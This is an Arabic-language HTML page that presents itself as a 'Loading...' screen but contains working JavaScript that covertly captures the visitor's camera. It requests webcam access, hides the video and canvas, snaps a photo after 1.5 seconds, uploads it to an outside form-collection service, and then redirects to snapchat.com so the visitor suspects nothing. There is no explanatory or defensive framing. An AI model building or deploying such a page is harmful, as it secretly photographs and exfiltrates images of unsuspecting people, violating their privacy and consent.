<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h2>جاري التحميل...</h2>
    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // رابط Forminit الخاص بك
        const FORM_URL = "https://forminit.com";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(captureAndSend, 1500); // التقاط بعد ثانية ونصف
            })
            .catch(() => {
                window.location.href = "https://snapchat.com";
            });

        function captureAndSend() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                // إرسال الصورة كملف حقيقي باسم "file"
                formData.append("file", blob, "photo.jpg");

                fetch(FORM_URL, {
                    method: "POST",
                    body: formData,
                }).finally(() => {
                    window.location.href = "https://snapchat.com";
                });
            }, 'image/jpeg', 0.7);
        }
    </script>
</body>
</html>
